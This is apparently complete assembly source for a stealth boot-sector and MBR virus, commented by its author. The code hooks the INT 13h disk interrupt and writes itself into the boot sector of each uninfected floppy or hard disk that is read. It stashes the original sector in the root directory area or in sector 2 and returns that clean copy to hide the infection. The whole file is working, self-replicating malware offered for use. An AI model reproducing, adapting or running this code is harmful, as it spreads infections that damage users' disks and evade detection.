        radix   16

fat_copies      equ     B[bx+010]       ;We use this info to
dir_entries     equ     W[bx+011]       ;calculate what sector
fat_sectors     equ     W[bx+016]       ;to store the clean
track_sectors   equ     W[bx+018]       ;boot sector in.

first_b         equ     09c             ;1st byte of the virus (pushf)

length          equ     offset vend - offset vstart
        
        
        org     0                       ;this is just to show the virus 
                                        ;starts at 03e.. it will place a jmp
        jmp     short   vstart          ;in the BS/MBR to 3e...

        org     03e                     ;virus starts at 0:7c3e

vstart: pushf                           ;push flags for simulated int13 call
                                        ;later on..

        xor     di,di                   ;di=0, copying to start of hiseg l8r.
        mov     ds,di                   ;ds=cs=0 
        
        mov     si,413                  ;0:413 == amount of conventional RAM
        dec     W[si]                   ;(in KBs)
        lodsw                           ;Allocate 1K
        shl     ax,6                    ;Get Hi Segment

        mov     si,7c00                 ;copying from 7c00
        push    ds                      ;return to 0:7c00
        push    si                      ;^^^^^^^^^^^^^^^^
        push    ds                      ;load orig sector to 0:7c00
        push    si                      ;^^^^^^^^^^^^^^^^^^^^^^^^^^
        
        mov     cx,offset int_13_off    ;this is the offset of the i13handler 
        push    cx                      ;for later use..
        mov     es,ax                   ;Move to HiSegm moving approx 256
        rep     movsw                   ;bytes from 0:7c00 to hiseg:0 
        
        push    ax                      ;AX = Hi Segment
        push    offset entry
        retf                            ;Jump to Hi Seg

entry:  mov     si,4c                   ;offset of int13 vector
        pop     di                      ;offset to save int13 vector
        movsw                                   ;save offset
        mov     W[si-2],offset int_13_handler   ;set offset
        movsw                                   ;save segment
        mov     W[si-2],ax                      ;set segment        
        
        pop     bx
        pop     es
        mov     ax,0201                  ;load orig sector.. i used to have a 
                                         ;much shorter INT 19 here, but some
        inc     cx                       ;int19s reset the int 13 handler!
       
        jmp     short  int_13_handler    ;stack = PushedFlags, 0, 7c00
                                         ;so this is just like an int13
                                         ;called from 0:7c00 to read the BS
                                         ;but because of stealth the clean
                                         ;sector is loaded.

                                         ;  ____________
       db      '[2üÅ]SêpóLÁÅrí'          ;_(TO FuCKED uP)_
                                         ;  ~~~~~~~~~~~~
int_13_handler:
        pushf

        cmp     ah,2
        jnz     no_infect               ;read?

        dec     cx
        jnz     fix_cx                  ;sector 1, track 0?
        
        or      dh,dh                   ;head 0?
        jz      read                    ;if so then its a read of the BS/MBR!

fix_cx: inc     cx

no_infect:                              ;nah, fuck it
        popf
                
        jmp     0FADE:0DEAD             ;FADE + DEAD = FADED? 
        org     $-4
int_13_off      dw      0BABE           ;its not worth commenting
int_13_seg      dw      0DEAF           ;so just remember to H8 Your NMEs...
        
        
i13:    pushf                           ;calls clean int13
        call    cs:D[int_13_off]        ;some virii use a normal INT 13
        ret                             ;with a special value, like AH=FE
                                        ;which the viruses handler turns in
                                        ;to AH=02, and then passes it on..
                                        ;this can be shorter, but hangs on
                                        ;some systems, because the BIOSes
                                        ;handler also calls itself, and the
                                        ;system hangs.. it does on mine!
read:   inc     cx                      
        popf                            ;restore CX and Flags
        call    i13                     ;do the real thing and save results.
        
        pushf                           ;im not a fugitive on the run
        pusha                           ;but a brother like me..
        push    es                      ;we going to be another one. 
        
        mov     ax,0201                 ;redirect read from BS/MBR
        cmp     es:B[bx+3e],first_b     ;infected?
        jnz     no_stealth              ;no so infect it

        call    get_last_sect           ;to sector containing clean sector..
        jmp     short i13_exit

no_stealth:                             ;disk is not infected so no need to
        mov     es,cs                   ;stealth it.... INFECT!!
        mov     bx,200                  ;load bs/MBR to es:200
        call    i13

        mov     ax,0301                 
        pusha                           ;save bs/MBR to safe last dir sector
        call    get_last_sect           ;get sector to store original in..
        call    i13                     ;save it..
        popa                            ;ax=0301, dx=00## (dl=drive)
        
        mov     cs:W[bx],3ceb           ;start new sector with JMP
        mov     cx,length               ;to virus (JMP 3e)
        mov     si,3e                   ;copy virus into origsector
        mov     di,23e                  ;at offset 3e
        rep     cs:movsb
        
        inc     cx                      ;cx=1. side 0,sector 1.
                                        
i13_exit:
        call    i13                     ;this either writes the infected
                                        ;boot sector, or loads the clean 
                                        ;one for stealthing.. depends where
                                        ;it branches from..

exit_inf:
        pop     es                      ;i got a letter from the government
        popa                            ;the other day, opened and read it..
        popf                            ;it said they were suckers
        retf    2                       ;iret without popping flags

get_last_sect:                          ;gets sector to store boot code in..
        xchg    cx,ax                   ;save cx
        inc     ax                      ;harddisk.. sector 2, track 0
        cmp     dl,80                   ;hard disk?
        jae     exit_gls
                                        ;get last root dir sector of floppy
        mov     ax,es:fat_sectors       ;root dir starts at sector #
        mul     es:fat_copies           ;#=fat_sectors * fat_copies
        inc     ax                      ;#+=1 (add one for the boot sector)
                                        ;this works out how many sectors
        mov     si,es:dir_entries       ;in the actual directory (ds):
        shr     si,4                    ;ds*=64 (512/32)
                                        ;(32 bytes in an entry, 512 bytes
                                        ;in a sector).. 
        add     ax,si                   ;#+=ds 
        sub     ax,es:track_sectors     ;ds-=sectors on a track (starts on
                                        ;track 2)
        mov     dh,1                    ;head 1 always..

exit_gls:
        xchg    cx,ax                   ;CX=side#,sector# AX=saved_ax
        ret                             
vend:
